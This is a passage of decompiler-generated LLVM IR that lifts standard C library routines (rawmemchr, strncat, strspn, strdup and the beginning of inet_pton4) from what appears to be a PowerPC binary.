  uselistorder label %dec_label_pc_1000e914, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000e92c = urem i32 %arg1, 256
  store i32 %v1_1000e92c, i32* %r4.global-to-local, align 4
  %v0_1000e9441 = load i32, i32* @r3, align 4
  %v1_1000e9442 = urem i32 %v0_1000e9441, 4
  %v3_1000e9444 = icmp eq i32 %v1_1000e9442, 0
  br i1 %v3_1000e9444, label %dec_label_pc_1000e94c, label %dec_label_pc_1000e934

dec_label_pc_1000e934:                            ; preds = %entry, %dec_label_pc_1000e934
  %v1_1000e938 = phi i32 [ %v0_1000e94c.pre, %dec_label_pc_1000e934 ], [ %v1_1000e92c, %entry ]
  %v0_1000e934 = phi i32 [ %v1_1000e940, %dec_label_pc_1000e934 ], [ %v0_1000e9441, %entry ]
  %v1_1000e934 = inttoptr i32 %v0_1000e934 to i8*
  %v2_1000e934 = load i8, i8* %v1_1000e934, align 1
  %v3_1000e934 = zext i8 %v2_1000e934 to i32
  %v4_1000e938 = icmp eq i32 %v3_1000e934, %v1_1000e938
  %v0_1000e93c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000e938, i32 %v0_1000e93c)
  %v0_1000e940 = load i32, i32* @r3, align 4
  %v1_1000e940 = add i32 %v0_1000e940, 1
  store i32 %v1_1000e940, i32* @r3, align 4
  %v1_1000e944 = urem i32 %v1_1000e940, 4
  %v3_1000e944 = icmp eq i32 %v1_1000e944, 0
  %v0_1000e94c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000e944, label %dec_label_pc_1000e94c, label %dec_label_pc_1000e934

dec_label_pc_1000e94c:                            ; preds = %dec_label_pc_1000e934, %entry
  %v0_1000e9649 = phi i32 [ %v0_1000e9441, %entry ], [ %v1_1000e940, %dec_label_pc_1000e934 ]
  %v0_1000e94c = phi i32 [ %v1_1000e92c, %entry ], [ %v0_1000e94c.pre, %dec_label_pc_1000e934 ]
  %v1_1000e94c = mul i32 %v0_1000e94c, 256
  %v2_1000e954 = or i32 %v1_1000e94c, %v0_1000e94c
  %v1_1000e95c = mul i32 %v2_1000e954, 65536
  %v2_1000e960 = or i32 %v1_1000e95c, %v2_1000e954
  br label %dec_label_pc_1000e964

dec_label_pc_1000e964:                            ; preds = %dec_label_pc_1000e9d0, %dec_label_pc_1000e964, %dec_label_pc_1000e94c
  %v0_1000e9a0 = phi i32 [ %v0_1000e9649, %dec_label_pc_1000e94c ], [ %v1_1000e968, %dec_label_pc_1000e964 ], [ %v1_1000e968, %dec_label_pc_1000e9d0 ]
  %v1_1000e964 = inttoptr i32 %v0_1000e9a0 to i32*
  %v2_1000e964 = load i32, i32* %v1_1000e964, align 4
  %v1_1000e968 = add i32 %v0_1000e9a0, 4
  %v1_1000e96c = add i32 %v0_1000e9a0, 2
  %v2_1000e970 = xor i32 %v2_1000e964, %v2_1000e960
  %v1_1000e978 = add i32 %v2_1000e970, 2130640639
  %v2_1000e97c = xor i32 %v1_1000e978, %v2_1000e970
  %v1_1000e980 = add i32 %v0_1000e9a0, 1
  %v2_1000e984 = and i32 %v2_1000e97c, -2130640640
  %v6_1000e984 = icmp eq i32 %v2_1000e984, -2130640640
  br i1 %v6_1000e984, label %dec_label_pc_1000e964, label %dec_label_pc_1000e990

dec_label_pc_1000e990:                            ; preds = %dec_label_pc_1000e964
  %v2_1000e990 = inttoptr i32 %v0_1000e9a0 to i8*
  %v3_1000e990 = load i8, i8* %v2_1000e990, align 1
  %v4_1000e990 = zext i8 %v3_1000e990 to i32
  %v1_1000e994 = add i32 %v0_1000e9a0, 3
  %v4_1000e998 = icmp eq i32 %v4_1000e990, %v0_1000e94c
  br i1 %v4_1000e998, label %dec_label_pc_1000e9a0, label %dec_label_pc_1000e9a8

dec_label_pc_1000e9a0:                            ; preds = %dec_label_pc_1000e990
  ret i32 %v0_1000e9a0

dec_label_pc_1000e9a8:                            ; preds = %dec_label_pc_1000e990
  %v2_1000e9a8 = inttoptr i32 %v1_1000e980 to i8*
  %v3_1000e9a8 = load i8, i8* %v2_1000e9a8, align 1
  %v4_1000e9a8 = zext i8 %v3_1000e9a8 to i32
  %v4_1000e9ac = icmp eq i32 %v4_1000e9a8, %v0_1000e94c
  br i1 %v4_1000e9ac, label %dec_label_pc_1000e9b4, label %dec_label_pc_1000e9bc

dec_label_pc_1000e9b4:                            ; preds = %dec_label_pc_1000e9a8
  ret i32 %v1_1000e980

dec_label_pc_1000e9bc:                            ; preds = %dec_label_pc_1000e9a8
  %v2_1000e9bc = inttoptr i32 %v1_1000e96c to i8*
  %v3_1000e9bc = load i8, i8* %v2_1000e9bc, align 1
  %v4_1000e9bc = zext i8 %v3_1000e9bc to i32
  %v4_1000e9c0 = icmp eq i32 %v4_1000e9bc, %v0_1000e94c
  br i1 %v4_1000e9c0, label %dec_label_pc_1000e9c8, label %dec_label_pc_1000e9d0

dec_label_pc_1000e9c8:                            ; preds = %dec_label_pc_1000e9bc
  ret i32 %v1_1000e96c

dec_label_pc_1000e9d0:                            ; preds = %dec_label_pc_1000e9bc
  %v2_1000e9d0 = inttoptr i32 %v1_1000e994 to i8*
  %v3_1000e9d0 = load i8, i8* %v2_1000e9d0, align 1
  %v4_1000e9d0 = zext i8 %v3_1000e9d0 to i32
  %v4_1000e9d4 = icmp eq i32 %v4_1000e9d0, %v0_1000e94c
  br i1 %v4_1000e9d4, label %dec_label_pc_1000e9dc, label %dec_label_pc_1000e964

dec_label_pc_1000e9dc:                            ; preds = %dec_label_pc_1000e9d0
  ret i32 %v1_1000e994

; uselistorder directives
  uselistorder i32 %v1_1000e968, { 1, 0 }
  uselistorder i32 %v0_1000e9a0, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_1000e954, { 1, 0 }
  uselistorder i32 %v0_1000e94c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000e940, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000e9441, { 2, 1, 0 }
  uselistorder i32 %v1_1000e92c, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000e934, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e9e8

dec_label_pc_1000e9e8:                            ; preds = %dec_label_pc_1000e9e8, %entry
  %v0_1000e9e8 = phi i32 [ %v1_1000e9ec, %dec_label_pc_1000e9e8 ], [ %tmp, %entry ]
  %v1_1000e9e8 = inttoptr i32 %v0_1000e9e8 to i8*
  %v2_1000e9e8 = load i8, i8* %v1_1000e9e8, align 1
  %v1_1000e9ec = add i32 %v0_1000e9e8, 1
  store i32 %v1_1000e9ec, i32* %r11.global-to-local, align 4
  %v3_1000e9f0 = icmp eq i8 %v2_1000e9e8, 0
  store i1 %v3_1000e9f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e9f0, label %dec_label_pc_1000e9f8, label %dec_label_pc_1000e9e8

dec_label_pc_1000e9f8:                            ; preds = %dec_label_pc_1000e9e8
  %v3_1000e9f8 = icmp eq i32 %arg2, 3
  store i1 %v3_1000e9f8, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e9fc = add i32 %v0_1000e9e8, -1
  store i32 %v1_1000e9fc, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1000ea98, label %dec_label_pc_1000ea08

dec_label_pc_1000ea08:                            ; preds = %dec_label_pc_1000e9f8
  %v1_1000ea08 = udiv i32 %arg2, 4
  store i32 %v1_1000ea08, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ea10

dec_label_pc_1000ea10:                            ; preds = %dec_label_pc_1000ea10.dec_label_pc_1000ea10_crit_edge, %dec_label_pc_1000ea08
  %v2_1000ea20 = phi i32 [ %v0_1000ea14.pre, %dec_label_pc_1000ea10.dec_label_pc_1000ea10_crit_edge ], [ %v1_1000e9fc, %dec_label_pc_1000ea08 ]
  %v0_1000ea10 = load i32, i32* @r4, align 4
  %v1_1000ea10 = inttoptr i32 %v0_1000ea10 to i8*
  %v2_1000ea10 = load i8, i8* %v1_1000ea10, align 1
  %v1_1000ea14 = add i32 %v2_1000ea20, 1
  store i32 %v1_1000ea14, i32* %r9.global-to-local, align 4
  %v1_1000ea18 = add i32 %v2_1000ea20, 2
  store i32 %v1_1000ea18, i32* %r7.global-to-local, align 4
  %v3_1000ea1c = icmp eq i8 %v2_1000ea10, 0
  store i1 %v3_1000ea1c, i1* %cr7_eq.global-to-local, align 1
  %v4_1000ea20 = inttoptr i32 %v1_1000ea14 to i8*
  store i8 %v2_1000ea10, i8* %v4_1000ea20, align 1
  %v0_1000ea24 = load i32, i32* @r4, align 4
  %v1_1000ea24 = add i32 %v0_1000ea24, 1
  store i32 %v1_1000ea24, i32* %r11.global-to-local, align 4
  %v0_1000ea28 = load i32, i32* @lr, align 4
  %v1_1000ea28 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ea28, i32 %v0_1000ea28)
  %v0_1000ea2c = load i32, i32* @r4, align 4
  %v1_1000ea2c = add i32 %v0_1000ea2c, 1
  %v2_1000ea2c = inttoptr i32 %v1_1000ea2c to i8*
  %v3_1000ea2c = load i8, i8* %v2_1000ea2c, align 1
  %v0_1000ea30 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ea30 = add i32 %v0_1000ea30, 1
  store i32 %v1_1000ea30, i32* %r8.global-to-local, align 4
  %v0_1000ea34 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000ea34 = add i32 %v0_1000ea34, 1
  store i32 %v1_1000ea34, i32* %r10.global-to-local, align 4
  %v3_1000ea38 = icmp eq i8 %v3_1000ea2c, 0
  store i1 %v3_1000ea38, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ea3c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ea3c = add i32 %v2_1000ea3c, 1
  %v4_1000ea3c = inttoptr i32 %v3_1000ea3c to i8*
  store i8 %v3_1000ea2c, i8* %v4_1000ea3c, align 1
  %v0_1000ea40 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ea40 = add i32 %v0_1000ea40, 1
  store i32 %v1_1000ea40, i32* %r9.global-to-local, align 4
  %v1_1000ea44 = add i32 %v0_1000ea40, 2
  store i32 %v1_1000ea44, i32* @r4, align 4
  %v0_1000ea48 = load i32, i32* @lr, align 4
  %v1_1000ea48 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ea48, i32 %v0_1000ea48)
  %v0_1000ea4c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ea4c = add i32 %v0_1000ea4c, 1
  %v2_1000ea4c = inttoptr i32 %v1_1000ea4c to i8*
  %v3_1000ea4c = load i8, i8* %v2_1000ea4c, align 1
  %v0_1000ea50 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ea50 = add i32 %v0_1000ea50, 1
  store i32 %v1_1000ea50, i32* %r11.global-to-local, align 4
  %v3_1000ea54 = icmp eq i8 %v3_1000ea4c, 0
  store i1 %v3_1000ea54, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ea58 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000ea58 = add i32 %v2_1000ea58, 1
  %v4_1000ea58 = inttoptr i32 %v3_1000ea58 to i8*
  store i8 %v3_1000ea4c, i8* %v4_1000ea58, align 1
  %v0_1000ea5c = load i32, i32* @lr, align 4
  %v1_1000ea5c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ea5c, i32 %v0_1000ea5c)
  %v0_1000ea60 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ea60 = add i32 %v0_1000ea60, 1
  %v2_1000ea60 = inttoptr i32 %v1_1000ea60 to i8*
  %v3_1000ea60 = load i8, i8* %v2_1000ea60, align 1
  %v4_1000ea60 = zext i8 %v3_1000ea60 to i32
  store i32 %v4_1000ea60, i32* %r9.global-to-local, align 4
  %v3_1000ea64 = icmp eq i8 %v3_1000ea60, 0
  store i1 %v3_1000ea64, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ea68 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000ea68 = add i32 %v2_1000ea68, 1
  %v4_1000ea68 = inttoptr i32 %v3_1000ea68 to i8*
  store i8 %v3_1000ea60, i8* %v4_1000ea68, align 1
  %v0_1000ea6c = load i32, i32* @lr, align 4
  %v1_1000ea6c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ea6c, i32 %v0_1000ea6c)
  %v0_1000ea70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ea70 = add i32 %v0_1000ea70, -1
  store i32 %v1_1000ea70, i32* %ctr.global-to-local, align 4
  %v2_1000ea70 = icmp eq i32 %v1_1000ea70, 0
  br i1 %v2_1000ea70, label %dec_label_pc_1000ea74, label %dec_label_pc_1000ea10.dec_label_pc_1000ea10_crit_edge

dec_label_pc_1000ea10.dec_label_pc_1000ea10_crit_edge: ; preds = %dec_label_pc_1000ea10
  %v0_1000ea14.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ea10

dec_label_pc_1000ea74:                            ; preds = %dec_label_pc_1000ea10
  %v0_1000ea74 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ea74 = urem i32 %v0_1000ea74, 4
  store i32 %v1_1000ea74, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ea98

dec_label_pc_1000ea7c:                            ; preds = %dec_label_pc_1000ea98, %dec_label_pc_1000ea7c.dec_label_pc_1000ea7c_crit_edge
  %v0_1000ea80 = phi i32 [ %v0_1000ea80.pre, %dec_label_pc_1000ea7c.dec_label_pc_1000ea7c_crit_edge ], [ %v0_1000ea98, %dec_label_pc_1000ea98 ]
  %v0_1000ea7c = load i32, i32* @r4, align 4
  %v1_1000ea7c = inttoptr i32 %v0_1000ea7c to i8*
  %v2_1000ea7c = load i8, i8* %v1_1000ea7c, align 1
  %v3_1000ea7c = zext i8 %v2_1000ea7c to i32
  store i32 %v3_1000ea7c, i32* %r9.global-to-local, align 4
  %v1_1000ea80 = add i32 %v0_1000ea80, -1
  store i32 %v1_1000ea80, i32* %r5.global-to-local, align 4
  %v1_1000ea84 = add i32 %v0_1000ea7c, 1
  store i32 %v1_1000ea84, i32* @r4, align 4
  %v3_1000ea88 = icmp eq i8 %v2_1000ea7c, 0
  store i1 %v3_1000ea88, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ea8c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000ea8c = add i32 %v2_1000ea8c, 1
  %v4_1000ea8c = inttoptr i32 %v3_1000ea8c to i8*
  store i8 %v2_1000ea7c, i8* %v4_1000ea8c, align 1
  store i32 %v3_1000ea8c, i32* %r11.global-to-local, align 4
  %v0_1000ea90 = load i32, i32* @lr, align 4
  %v1_1000ea90 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ea90, i32 %v0_1000ea90)
  %v0_1000eaa0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eaa0 = add i32 %v0_1000eaa0, -1
  store i32 %v1_1000eaa0, i32* %ctr.global-to-local, align 4
  %v2_1000eaa0 = icmp eq i32 %v1_1000eaa0, 0
  br i1 %v2_1000eaa0, label %dec_label_pc_1000eaa4, label %dec_label_pc_1000ea7c.dec_label_pc_1000ea7c_crit_edge

dec_label_pc_1000ea7c.dec_label_pc_1000ea7c_crit_edge: ; preds = %dec_label_pc_1000ea7c
  %v0_1000ea80.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ea7c

dec_label_pc_1000ea98:                            ; preds = %dec_label_pc_1000e9f8, %dec_label_pc_1000ea74
  %v0_1000ea98 = phi i32 [ %arg2, %dec_label_pc_1000e9f8 ], [ %v1_1000ea74, %dec_label_pc_1000ea74 ]
  store i32 %v0_1000ea98, i32* %ctr.global-to-local, align 4
  %v2_1000eaa03 = icmp eq i32 %v0_1000ea98, 0
  br i1 %v2_1000eaa03, label %dec_label_pc_1000eaa4, label %dec_label_pc_1000ea7c

dec_label_pc_1000eaa4:                            ; preds = %dec_label_pc_1000ea7c, %dec_label_pc_1000ea98
  %v0_1000eaa4 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000eaa4 = icmp eq i32 %v0_1000eaa4, 0
  store i1 %v3_1000eaa4, i1* %cr7_eq.global-to-local, align 1
  %v0_1000eaa8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000eaa4, i32 %v0_1000eaa8)
  %v0_1000eaac = load i32, i32* %r5.global-to-local, align 4
  %v1_1000eaac = trunc i32 %v0_1000eaac to i8
  %v2_1000eaac = load i32, i32* %r11.global-to-local, align 4
  %v3_1000eaac = add i32 %v2_1000eaac, 1
  %v4_1000eaac = inttoptr i32 %v3_1000eaac to i8*
  store i8 %v1_1000eaac, i8* %v4_1000eaac, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1000ea98, { 1, 2, 0 }
  uselistorder i32 %v1_1000eaa0, { 1, 0 }
  uselistorder i32 %v1_1000ea74, { 1, 0 }
  uselistorder i32 %v1_1000ea70, { 1, 0 }
  uselistorder i32 %v2_1000ea20, { 1, 0 }
  uselistorder i32 %v1_1000e9ec, { 1, 0 }
  uselistorder i32 %v0_1000e9e8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000eaa4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ea98, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000eae41 = load i32, i32* @r3, align 4
  %v1_1000eae42 = inttoptr i32 %v0_1000eae41 to i8*
  %v2_1000eae43 = load i8, i8* %v1_1000eae42, align 1
  %v3_1000eae86 = icmp eq i8 %v2_1000eae43, 0
  br i1 %v3_1000eae86, label %dec_label_pc_1000eaf8, label %dec_label_pc_1000eaf0

dec_label_pc_1000eac0:                            ; preds = %dec_label_pc_1000eac0, %dec_label_pc_1000eaf0
  %v0_1000eac0 = phi i32 [ %v1_1000eac4, %dec_label_pc_1000eac0 ], [ %tmp, %dec_label_pc_1000eaf0 ]
  %v1_1000eac0 = inttoptr i32 %v0_1000eac0 to i8*
  %v2_1000eac0 = load i8, i8* %v1_1000eac0, align 1
  %v1_1000eac4 = add i32 %v0_1000eac0, 1
  %v3_1000eac8 = icmp eq i8 %v2_1000eac0, 0
  %v4_1000eacc = icmp eq i8 %v0_1000eacc8.in, %v2_1000eac0
  %brmerge = or i1 %v3_1000eac8, %v4_1000eacc
  br i1 %brmerge, label %dec_label_pc_1000ead4, label %dec_label_pc_1000eac0

dec_label_pc_1000ead4:                            ; preds = %dec_label_pc_1000eac0
  br i1 %v3_1000eac8, label %dec_label_pc_1000eaf8, label %dec_label_pc_1000eadc

dec_label_pc_1000eadc:                            ; preds = %dec_label_pc_1000ead4
  %v1_1000eadc = add i32 %v0_1000eadc, 1
  %v1_1000eae0 = add i32 %v0_1000eae0, 1
  %v1_1000eae4 = inttoptr i32 %v1_1000eae0 to i8*
  %v2_1000eae4 = load i8, i8* %v1_1000eae4, align 1
  %v3_1000eae8 = icmp eq i8 %v2_1000eae4, 0
  br i1 %v3_1000eae8, label %dec_label_pc_1000eaf8, label %dec_label_pc_1000eaf0

dec_label_pc_1000eaf0:                            ; preds = %entry, %dec_label_pc_1000eadc
  %v0_1000eae0 = phi i32 [ %v1_1000eae0, %dec_label_pc_1000eadc ], [ %v0_1000eae41, %entry ]
  %v0_1000eadc = phi i32 [ %v1_1000eadc, %dec_label_pc_1000eadc ], [ 0, %entry ]
  %v0_1000eacc8.in = phi i8 [ %v2_1000eae4, %dec_label_pc_1000eadc ], [ %v2_1000eae43, %entry ]
  br label %dec_label_pc_1000eac0

dec_label_pc_1000eaf8:                            ; preds = %dec_label_pc_1000eadc, %dec_label_pc_1000ead4, %entry
  %v0_1000eaf8 = phi i32 [ 0, %entry ], [ %v1_1000eadc, %dec_label_pc_1000eadc ], [ %v0_1000eadc, %dec_label_pc_1000ead4 ]
  ret i32 %v0_1000eaf8

; uselistorder directives
  uselistorder i32 %v0_1000eac0, { 1, 0 }
  uselistorder label %dec_label_pc_1000eaf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000eac0, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1000eb14 = call i32 @__GI_strlen()
  %v1_1000eb18 = add i32 %v0_1000eb14, 1
  store i32 %v1_1000eb18, i32* @r29, align 4
  store i32 %v1_1000eb18, i32* @r3, align 4
  store i32 268495652, i32* @lr, align 4
  %v0_1000eb20 = call i32 @malloc()
  store i32 %v0_1000eb20, i32* @r3, align 4
  %v0_1000eb24 = load i32, i32* @r28, align 4
  store i32 %v0_1000eb24, i32* @r4, align 4
  store i32 %v0_1000eb20, i32* @r31, align 4
  %v3_1000eb28 = icmp eq i32 %v0_1000eb20, 0
  %v0_1000eb2c = load i32, i32* @r29, align 4
  store i32 %v0_1000eb2c, i32* @r5, align 4
  br i1 %v3_1000eb28, label %dec_label_pc_1000eb38, label %dec_label_pc_1000eb34

dec_label_pc_1000eb34:                            ; preds = %entry
  store i32 268495672, i32* @lr, align 4
  %v0_1000eb34 = call i32 @memcpy()
  %v0_1000eb3c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000eb38

dec_label_pc_1000eb38:                            ; preds = %entry, %dec_label_pc_1000eb34
  %v0_1000eb3c = phi i32 [ 0, %entry ], [ %v0_1000eb3c.pre, %dec_label_pc_1000eb34 ]
  ret i32 %v0_1000eb3c

; uselistorder directives
  uselistorder i32 ()* @malloc, { 8, 3, 2, 15, 14, 7, 6, 13, 12, 11, 10, 9, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_1000eb38, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000eb50 = load i32, i32* @lr, align 4
  store i32 %v0_1000eb50, i32* %r0.global-to-local, align 4
  %v0_1000eb58 = call i32 @__asm_mfcr()
  store i32 %v0_1000eb58, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000eb64 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000eb64, i32* %r7.global-to-local, align 4
  %v0_1000eb68 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ebd0

dec_label_pc_1000eb80:                            ; preds = %dec_label_pc_1000ebd0
  %v3_1000eb80 = icmp eq i32 %v0_1000ebf4, 4
  store i1 %v3_1000eb80, i1* %cr7_eq.global-to-local, align 1
  %v0_1000eb84 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000eb84, label %dec_label_pc_1000ebbc, label %dec_label_pc_1000eb88

dec_label_pc_1000eb88:                            ; preds = %dec_label_pc_1000eb80
  %v0_1000eb88 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000eb88 = inttoptr i32 %v0_1000eb88 to i8*
  %v2_1000eb88 = load i8, i8* %v1_1000eb88, align 1
  %v3_1000eb88 = zext i8 %v2_1000eb88 to i32
  %v1_1000eb8c = mul nuw nsw i32 %v3_1000eb88, 10
  %v1_1000eb90 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000eb90 = add i32 %v1_1000eb8c, %v1_1000eb90
  %v1_1000eb94 = add i32 %v2_1000eb90, -48
  store i32 %v1_1000eb94, i32* %r0.global-to-local, align 4
  %v2_1000eb98 = icmp ugt i32 %v1_1000eb94, 255
  %v3_1000eb98 = icmp eq i32 %v1_1000eb94, 255
  store i1 %v3_1000eb98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000eb98, label %dec_label_pc_1000ec18, label %dec_label_pc_1000eba0

dec_label_pc_1000eba0:                            ; preds = %dec_label_pc_1000eb88
  %v1_1000eba0 = trunc i32 %v1_1000eb94 to i8
  store i8 %v1_1000eba0, i8* %v1_1000eb88, align 1
  %v0_1000eba4 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000eba4, label %dec_label_pc_1000eba8, label %dec_label_pc_1000ebd0.backedge

dec_label_pc_1000eba8:                            ; preds = %dec_label_pc_1000eba0
  %v0_1000eba8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000eba8 = add i32 %v0_1000eba8, 1
  store i32 %v1_1000eba8, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_1000ebb0 = icmp sgt i32 %v1_1000eba8, 4
  %v3_1000ebb0 = icmp eq i32 %v1_1000eba8, 4
  store i1 %v3_1000ebb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ebb0, label %dec_label_pc_1000ec18, label %dec_label_pc_1000ebd0.backedge

dec_label_pc_1000ebbc:                            ; preds = %dec_label_pc_1000eb80
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1000ebc0 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_1000ebc0.not = xor i1 %v0_1000ebc0, true
  %v0_1000ebc4 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000eb80, %v0_1000ebc4
  %or.cond = or i1 %brmerge, %v0_1000ebc0.not
  br i1 %or.cond, label %dec_label_pc_1000ec18, label %dec_label_pc_1000ebcc

dec_label_pc_1000ebcc:                            ; preds = %dec_label_pc_1000ebbc
  %v0_1000ebcc = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ebcc = trunc i32 %v0_1000ebcc to i8
  %v2_1000ebcc = load i32, i32* %r7.global-to-local, align 4
  %v3_1000ebcc = add i32 %v2_1000ebcc, 1
  %v4_1000ebcc = inttoptr i32 %v3_1000ebcc to i8*
  store i8 %v1_1000ebcc, i8* %v4_1000ebcc, align 1
  store i32 %v3_1000ebcc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000ebd0.backedge

dec_label_pc_1000ebd0.backedge:                   ; preds = %dec_label_pc_1000ebcc, %dec_label_pc_1000eba0, %dec_label_pc_1000eba8
  %v0_1000ebd0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000ebd4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ebd0

dec_label_pc_1000ebd0:                            ; preds = %dec_label_pc_1000ebd0.backedge, %entry
  %v0_1000ebd4 = phi i32 [ %v0_1000ebd4.pre, %dec_label_pc_1000ebd0.backedge ], [ 0, %entry ]
  %v0_1000ebd8 = phi i32 [ %v0_1000ebd0.pre, %dec_label_pc_1000ebd0.backedge ], [ %v0_1000eb58, %entry ]
  %v1_1000ebd0 = inttoptr i32 %v0_1000ebd8 to i8*
  %v2_1000ebd0 = load i8, i8* %v1_1000ebd0, align 1
  %v3_1000ebd0 = zext i8 %v2_1000ebd0 to i32
  store i32 %v3_1000ebd0, i32* %r11.global-to-local, align 4
  %v3_1000ebd4 = icmp eq i32 %v0_1000ebd4, 0
  store i1 %v3_1000ebd4, i1* %cr4_eq.global-to-local, align 1
  %v1_1000ebd8 = add i32 %v0_1000ebd8, 1
  store i32 %v1_1000ebd8, i32* %r3.global-to-local, align 4
  %v3_1000ebdc = icmp eq i8 %v2_1000ebd0, 0
  store i1 %v3_1000ebdc, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ebe0 = add nsw i32 %v3_1000ebd0, -48
  store i32 %v1_1000ebe0, i32* %r0.global-to-local, align 4
